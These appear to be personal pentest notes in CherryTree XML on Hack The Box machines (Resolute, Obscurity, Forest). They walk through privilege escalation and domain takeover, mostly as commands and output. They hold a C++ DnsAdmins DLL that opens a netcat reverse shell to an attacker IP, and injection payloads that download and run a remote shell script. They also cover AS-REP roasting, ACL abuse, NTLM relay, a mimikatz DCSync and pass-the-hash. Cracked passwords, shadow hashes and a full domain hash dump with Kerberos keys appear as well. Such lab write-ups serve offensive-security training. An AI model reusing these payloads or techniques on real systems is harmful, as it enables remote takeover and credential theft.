+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group             
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group             
+</rich_text>
+			<rich_text weight="heavy">MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group</rich_text>
+			<rich_text>
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group             
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192    
+
+- We see that the user is part of the DnsAdmins and we do a quick google search to find out that the users having write access to DNS objects can load aribtrary DLL to gain SYSTEM privs.
+- We read the following articles to build our payload - 
+   → </rich_text>
+			<rich_text link="webs http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html</rich_text>
+			<rich_text>
+   → </rich_text>
+			<rich_text link="webs http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html</rich_text>
+			<rich_text>
+   → </rich_text>
+			<rich_text link="webs https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83</rich_text>
+			<rich_text>
+- Our payload is written in cpp and then using mingw-w64 to compile it.
+</rich_text>
+			<rich_text weight="heavy">//dllmain.cpp: Defines the entry point for the DLL application
+//#include &quot;stdafx.h&quot;
+#include &quot;stdio.h&quot;
+#include &quot;windows.h&quot;
+#include &quot;stdlib.h&quot;
+#define EXTERN_DLL_EXPORT extern &quot;C&quot; __declspec(dllexport)
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,LPVOID lpReserved){
+switch(ul_reason_for_call){
+case DLL_PROCESS_ATTACH:
+case DLL_THREAD_ATTACH:
+case DLL_THREAD_DETACH:
+case DLL_PROCESS_DETACH:
+        break;
+} 
+return TRUE;
+}
+
+EXTERN_DLL_EXPORT int DnsPluginInitialize(PVOID a1 , PVOID a2){
+system(&quot;C:\\users\\ryan\\desktop\\nc64.exe 10.10.14.3 9002 -e cmd.exe&quot;);
+return 0;
+}
+
+EXTERN_DLL_EXPORT int DnsPluginCleanup(){
+return 0;
+}
+
+EXTERN_DLL_EXPORT int DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4){
+return 0;
+}</rich_text>
+			<rich_text>
+
+- We then test our payload so that it works. We transfer the dll to the box and run:-
+   → rundll32.exe .\dnsprivesc.dll,DnsPluginInitialize 
+  and we see it works.
+  
+- So we setup a networks share with smbserver.py and call the dll from the box using the share:-
+   → </rich_text>
+			<rich_text weight="heavy">dnscmd.exe resolute.megabank.local /config /ServerLevelPluginDll \\10.10.14.3\SHARE\dnsprivesc.dll</rich_text>
+			<rich_text>
+   we shoudl get this message - “Registry property ServerLevelPluginDll successfully reset. Command completed successfully.”
+
+- Post that we setup a listener and run:-
+   → sc.exe \\resolute.megabank.local stop dns
+   and after sometime 
+   → sc.exe \\resolute,\.megabank.local start dns 
+
+- If everything works well we will get the shell as nt authority / system    </rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Obscurity" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576233247.29" ts_lastsave="1576670362.79" unique_id="36">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576233269.82" ts_lastsave="1576626627.91" unique_id="37">
+			<rich_text>Ports :  
+
+PORT     STATE  SERVICE    REASON
+22/tcp   open   ssh        syn-ack ttl 63
+80/tcp   closed http       reset ttl 63
+8080/tcp open   http-proxy syn-ack ttl 63
+9000/tcp closed cslistener reset ttl 63
+
+We get the SuperSecureServer.py under the develop folder using the fuff tool
+We found the vulnerability in exec function and use the url encoded strings to drop a rev.sh script in tmp folder and then executing it to get a reverse shell.
+
+
+PAYLOADS:- 
+- /etc/passwd';os.system('curl 10.10.14.12/rev.sh -o /tmp/rev.sh');'\t
+- /etc/passwd';os.system('/bin/sh /tmp/rev.sh');'\t
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576618316.88" ts_lastsave="1576626701.95" unique_id="38">
+			<rich_text>SuperSecureCrypt:-
+
+The key can be derived by providing the cipher file (out.txt ) and key as the plaintext (check.txt)
+We derive the key as alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal
+We use the key to cerypt the passwordreminder.txt file.
+Password -  SecThruObsFTW
+
+We use the username as robert and password to SSH into the box.
+
+Script changes :- 
+
+
+import sys
+import argparse
+
+def encrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    encrypted = &quot;&quot;
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr + ord(keyChr)) % 255)
+        encrypted += newChr
+        keyPos += 1
+        keyPos = keyPos % keylen
+    return encrypted
+
+def decrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    decrypted = &quot;&quot;
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr - ord(keyChr)) % 255)
+        decrypted += newChr
+        keyPos += 1
+        keyPos = keyPos % keylen
+    return decrypted
+
+parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')
+
+parser.add_argument('-i',
+                    metavar='InFile',
+                    type=str,
+                    help='The file to read',
+                    required=False)
+
+parser.add_argument('-o',
+                    metavar='OutFile',
+                    type=str,
+                    help='Where to output the encrypted/decrypted file',
+                    required=False)
+
+parser.add_argument('-k',
+                    metavar='Key',
+                    type=str,
+                    help='Key to use',
+                    required=False)
+
+parser.add_argument('-d', action='store_true', help='Decrypt mode')
+
+args = parser.parse_args()
+
+banner = &quot;################################\n&quot;
+banner+= &quot;#           BEGINNING          #\n&quot;
+banner+= &quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;
+banner+= &quot;################################\n&quot;
+banner += &quot;  ############################\n&quot;
+banner += &quot;  #        FILE MODE         #\n&quot;
+banner += &quot;  ############################&quot;
+print(banner)
+if args.o == None or args.k == None or args.i == None:
+    print(&quot;Missing args&quot;)
+else:
+    if args.d:
+        print(&quot;Opening file {0}...&quot;.format(args.i))
+        with open(args.i, 'r', encoding='UTF-8') as f:
+            data = f.read()
+        </rich_text>
+			<rich_text weight="heavy">print (&quot;Openin key file {0}...&quot;,format(args.i))
+        with open(args.k,'r', encoding='UTF-8') as f:
+            key = f.read()               
+        print(&quot;Decrypting...&quot;)
+        decrypted = decrypt(data, key)</rich_text>
+			<rich_text>
+
+        print(&quot;Writing to {0}...&quot;.format(args.o))
+        with open(args.o, 'w', encoding='UTF-8') as f:
+            f.write(decrypted)
+    else:
+        print(&quot;Opening file {0}...&quot;.format(args.i))
+        with open(args.i, 'r', encoding='UTF-8') as f:
+            data = f.read()
+
+        print(&quot;Encrypting...&quot;)
+        encrypted = encrypt(data, args.k)
+
+        print(&quot;Writing to {0}...&quot;.format(args.o))
+        with open(args.o, 'w', encoding='UTF-8') as f:
+            f.write(encrypted)
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576618493.83" ts_lastsave="1576625758.49" unique_id="39">
+			<rich_text>Create a SSH key for 1st login &amp;&amp; create another session with password
+
+With SSH key session
+Run the sudo command
+sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+
+With password session
+Run the watch -n 0.1 /tmp/SSH /tmp/temp
+
+
+we get the following contents
+root
+$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
+18226
+0
+99999
+7
+
+
+
+
+robert
+$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
+18163
+0
+99999
+7
+
+Cracking the hash of the root we get the password for root as - mercedes
+we can read the root flag
+</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Forest" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576670362.8" ts_lastsave="1577009557.84" unique_id="40">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576670376.18" ts_lastsave="1576852613.59" unique_id="41">
+			<rich_text>Ports 
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-18 00:01:55Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at </rich_text>
+			<rich_text link="webs https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</rich_text>
+			<rich_text> :
+SF-Port53-TCP:V=7.80%I=7%D=12/17%Time=5DF96AA8%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03&quot;);
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+Port 139/445 :- authentication required
+port 389 - Nothing interesting
+
+port 135 :- 
+- anonymous login enabled
+ 
+ user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+user:[pentest] rid:[0x1db1]
+
+- Use impacket script - GetNPUsers.py to get the challenge hash of the account svc-alfresco
+
+</rich_text>
+			<rich_text weight="heavy">./GetNPUsers.py htb.local/ -usersfile ~/Desktop/HTB/boxes/Forest/users.txt -format hashcat -outputfile ~/Desktop/HTB/boxes/Forest/hashes.txt -dc-ip 10.10.10.161
+</rich_text>
+			<rich_text>
+- Password for user svc-alfresco : s3rvice [ got it from cracking the ASREP hash]
+
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576852629.68" ts_lastsave="1576853090.28" unique_id="42">
+			<rich_text>- We use the found creds with winrm to get a shell and the drop a netcat to get the reverse shell
+- Now we can the read the user flag.
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576853132.47" ts_lastsave="1576971559.48" unique_id="43">
+			<rich_text>- Install and setup bloodhound in kali
+- Clone the BloodHound repo  and find out Sharphound.ps1
+- Copy the Sharphound.ps1 to the box and run the following command:-
+   → </rich_text>
+			<rich_text weight="heavy">Invoke-BloodHound -CollectionMethod All -LdapUser svc-alfresco -LdapPass s3rvice</rich_text>
+			<rich_text>
+- After analyzing the graph and find a path we see we can add a user and make him the member of “Exchange Windows Permissions” 
+- We issue commands: 
+   </rich_text>
+			<rich_text weight="heavy">→ net user pentest pentest /ADD
+   → Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members pentest -verbose</rich_text>
+			<rich_text>
+    
+   ---- Now we have a member that we own and is a member of Exchange Windows Permissions
+- Now we can reset the password of the user pentest and login as him
+- We issue the command to reset the password 
+   </rich_text>
+			<rich_text weight="heavy">→ Add-DomainObjectAcl -TargetIdentity pentest -PrincipalIdentity svc-alfresco -Rights ResetPassword -verbose
+   → Add-ADGroupMember -Identity &quot;Remote Management Users&quot; -Members pentest -verbose [To enable PS remoting]
+   → $pass = ConvertTo-SecureString 'PleaseSubscribe!' -AsPlainText -Force
+   → Set-DomainUserPassword pentest -AccountPassword $pass -verbose</rich_text>
+			<rich_text>
+ 
+- After Logging as the new user we issue the following commands:-
+   → </rich_text>
+			<rich_text weight="heavy">./ntlmrelayx.py -t ldap://htb.local --escalate-user pentest</rich_text>
+			<rich_text>
+   → </rich_text>
+			<rich_text weight="heavy">./psexec.py htb.local/pentest@10.10.14.12 &quot;powershell.exe iwr </rich_text>
+			<rich_text link="webs http://10.10.14.12" weight="heavy">http://10.10.14.12</rich_text>
+			<rich_text weight="heavy"> -UseDefaultCredentials&quot;</rich_text>
+			<rich_text>
+   → Once we get the output like this:- 
+      ⇒ [*] Protocol Client SMB loaded..
+            [*] Protocol Client LDAPS loaded..
+            [*] Protocol Client LDAP loaded..
+            [*] Protocol Client IMAP loaded..
+            [*] Protocol Client IMAPS loaded..
+            [*] Protocol Client MSSQL loaded..
+            [*] Protocol Client HTTPS loaded..
+            [*] Protocol Client HTTP loaded..
+            [*] Protocol Client SMTP loaded..
+            [*] Running in relay mode to single host
+            [*] Setting up SMB Server
+            [*] Setting up HTTP Server
+
+            [*] Servers started, waiting for connections
+            [*] SMBD-Thread-3: Received connection from 10.10.14.12, attacking target ldap://htb.local
+            [*] Authenticating against ldap://htb.local as htb.local\pentest SUCCEED
+            [*] Enumerating relayed user's privileges. This may take a while on large domains
+            [*] User privileges found: Create user
+            [*] User privileges found: Modifying domain ACL
+            [*] Querying domain security descriptor
+           </rich_text>
+			<rich_text weight="heavy"> [*] Success! User pentest now has Replication-Get-Changes-All privileges on the domain</rich_text>
+			<rich_text>
+            [*] Try using DCSync with secretsdump.py and this user :)
+            [*] Saved restore state to aclpwn-20191221-165801.restore
+
+Reference:-  </rich_text>
+			<rich_text link="webs https://yojimbosecurity.ninja/dcsync/">https://yojimbosecurity.ninja/dcsync/</rich_text>
+			<rich_text> , </rich_text>
+			<rich_text link="webs https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</rich_text>
+			<rich_text> , </rich_text>
+			<rich_text link="webs https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</rich_text>
+			<rich_text> , 
+                     </rich_text>
+			<rich_text link="webs https://pentestlab.blog/tag/dcsync/">https://pentestlab.blog/tag/dcsync/</rich_text>
+			<rich_text>
+
+- After getting the privilege success message we drop the mimikatz binary on the box and run:-
+   → </rich_text>
+			<rich_text weight="heavy">lsadump::dcsync /user:administrator /domain:htb.local</rich_text>
+			<rich_text>
+   → We get the Hash for the admin - Credentials:
+  Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6
+
+- Now we can use this Hash to get the shell on the box using wmiexec from imapcket. We issue the command:- 
+   → ./wmiexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+
+- Now we can read the file Root.txt - - f048153f202bbb2f82622b04d79129cc               
+
+BONUS: using the command we can dump all the hashes we want:- 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</rich_text>
+			<rich_text weight="heavy">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</rich_text>
+			<rich_text>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+Jack:7601:aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72:::
+pentest:7602:aad3b435b51404eeaad3b435b51404ee:cebb2479192aee8b923140b9b32b71ea:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:157e7974274e50520c6bce25e720cd94:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
+Jack:aes256-cts-hmac-sha1-96:f127edde105330b51308e8b088a34d4d535de80a1a1b8af06ec3a41db3a5dcc9
+Jack:aes128-cts-hmac-sha1-96:b1f11259b3678b3453ab0daeda39a489
+Jack:des-cbc-md5:92e6732f3413252f
+pentest:aes256-cts-hmac-sha1-96:720ea156fcd7cc83549b69e2489d8b61c45ec491735e7b1a53fd3e08fae4e492
+pentest:aes128-cts-hmac-sha1-96:4c77cb0ea124ba92c379458565b1eefb
+pentest:des-cbc-md5:2cd9ceb345fe895e
+FOREST$:aes256-cts-hmac-sha1-96:7b49b425e251328829cc7aab7584210b60b6bc6103f7ae9873f92d4079d9c979
+FOREST$:aes128-cts-hmac-sha1-96:f370a380206bd9f2299689a456f54a64
+FOREST$:des-cbc-md5:6b5b7016b9f1c431
+EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
